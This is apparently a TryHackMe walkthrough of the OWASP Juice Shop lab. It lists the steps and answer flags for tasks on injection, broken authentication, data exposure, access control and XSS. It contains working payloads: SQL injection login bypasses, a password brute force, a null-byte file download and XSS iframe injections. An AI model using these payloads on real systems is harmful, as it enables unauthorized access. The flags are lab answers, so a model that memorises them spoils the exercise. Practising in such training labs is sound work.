# THM - OWASP Juice Shop

<br>

https://owasp.org/www-project-top-ten/

https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html

https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication.html

https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html

https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html

https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html

## Task 2

http://10.10.152.86/

### Task 2.1

> admin@juice-sh.op

### Task 2.2

http://10.10.152.86/#/search?q=a

> q

### Task 2.3

🧰 https://www.google.com/search?q=replicator

> Star Trek

<br>

## Task 3

https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html

### Task 3.1

http://10.10.152.86/#/login

Burp Suite (Proxy->Intercept):
```json
{"email":"' or 1=1--","password":"a"}
```

> 32a5e0f21372bcc1000a6088b93b458e41f0e02a

### Task 3.2

http://10.10.152.86/#/login

Burp Suite (Proxy->Intercept):
```json
{"email":"bender@juice-sh.op'--","password":"a"}
```

> fb364762a3c102b2db932069c0e6b78e738d4066

<br>

## Task 4

https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication.html

### Task 4.1

http://10.10.152.86/#/login

Burp Suite (Intruder->Positions):
```json
{"email":"admin@juice-sh.op","password":"§§"}
```

Burp Suite (Intruder->Payloads->Payloads Options->Load):
```text
../../Tools/SecLists/Passwords/Common-Credentials/best1050.txt
```

<br>

```text
Password: admin123
```

> c2110d06dc6f81c67cd8099ff0ba601241f1ac0e

### Task 4.2

🧰 https://www.google.com/search?q=Jim+Star+Trek

🧰 https://en.wikipedia.org/wiki/James_T._Kirk#:~:text=George%20Samuel%20Kirk%20(brother)

http://10.10.152.86/#/forgot-password
```text
Email: jim@juice-sh.op
Security Question (Your eldest siblings middle name?): Samuel
...
```

> 094fbc9b48e525150ba97d05b942bbf114987257

<br>

## Task 5

https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html

### Task 5.1

http://10.10.152.86/ftp/legal.md

http://10.10.152.86/ftp/

10.10.152.86/ftp/acquisitions.md

> edf9281222395a1c5fee9b89e32175f1ccf50c5b

### Task 5.2

https://www.youtube.com/watch?v=v59CX2DiX0Y

http://10.10.152.86/#/login
```text
Email: mc.safesearch@juice-sh.op
Password: Mr. N00dles
```

> 66bdcffad9e698fd534003fbb3cc7e2b7b55d7f0

### Task 5.3

http://10.10.152.86/ftp/

http://10.10.152.86/ftp/package.json.bak

10.10.152.86/ftp/package.json.bak%2500.md

> bfc1e6b4a16579e85e06fee4c36ff8c02fb13795

<br>

## Task 6

https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html

### Task 6.1

http://10.10.152.86/#/login
```text
Email: admin@juice-sh.op
Password: admin123
```

10.10.152.86/#/administration

> 946a799363226a24822008503f5d1324536629a0

### Task 6.2

http://10.10.152.86/#/basket

Burp Suite (Proxy->Intercept):
```http
GET /rest/basket/2 HTTP/1.1
```

> 41b997a36cc33fbe4f0ba018474e19ae5ce52121

### Task 6.3

http://10.10.152.86/#/administration

> 50c97bcce0b895e446d61c83a21df371ac2266ef

<br>

## Task 7

https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html

### Task 7.1

```html
<iframe src="javascript:alert(`xss`)"> 
```

> 9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf

### Task 7.2

http://10.10.152.86/#/privacy-security/last-login-ip

Burp Suite (Proxy->Intercept):
```http
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```

> 149aa8ce13d7a4a8a931472308e269c94dc5f156

### Task 7.3

http://10.10.152.86/#/login
```text
Email: admin@juice-sh.op
Password: admin123
```

http://10.10.152.86/#/order-history

http://10.10.152.86/#/track-result?id=5267-5bf0368c32ee38b6

http://10.10.152.86/#/track-result?id=<iframe src="javascript:alert(`xss`)">

> 23cefee1527bde039295b2616eeb29e1edc660a0

<br>

## Task 8

### Task 8.1

10.10.152.86/#/score-board/

> 7efd3174f9dd5baa03a7882027f2824d2f72d86e









